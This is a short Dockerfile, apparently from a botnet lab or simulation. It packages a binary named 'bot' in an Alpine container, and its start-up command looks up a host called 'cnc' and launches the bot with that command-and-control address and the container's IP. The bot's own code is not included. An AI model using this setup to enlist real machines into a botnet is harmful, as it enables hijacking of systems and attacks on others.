FROM alpine
ADD bot /
RUN apk update 
RUN apk add --update --no-cache bind-tools
CMD IP=`ifconfig eth0 | grep 'inet addr:' | cut -d: -f2 | awk '{ print $1}'` && CNC=`nslookup cnc | awk '/^Address: / { print $2 }'` && /bot $CNC $IP $CNC 0
